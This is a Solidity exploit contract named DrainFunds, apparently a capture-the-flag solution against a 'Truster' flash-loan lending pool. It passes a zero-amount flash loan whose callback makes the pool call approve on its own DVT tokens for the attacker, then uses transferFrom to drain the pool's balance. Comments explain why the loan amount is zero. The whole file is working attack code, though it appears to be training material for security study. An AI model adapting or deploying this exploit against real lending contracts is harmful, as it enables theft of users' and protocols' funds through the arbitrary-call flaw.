// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract DrainFunds {
    function executeFlashLoan(ITrusterLenderPool _lenderPool, IERC20 _dvtToken)
        external
    {
        uint256 attackAmount = 1000000 ether;
        bytes memory functionCallData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            attackAmount
        );

        // taking approval from pool contract
        // not taking any loan from pool so that the tx doesn't revert on last check of pool's function
        // draining pool funds as we now have an approval
        _lenderPool.flashLoan(
            0,
            msg.sender,
            address(_dvtToken),
            functionCallData
        );
        _dvtToken.transferFrom(address(_lenderPool), msg.sender, attackAmount);
    }
}
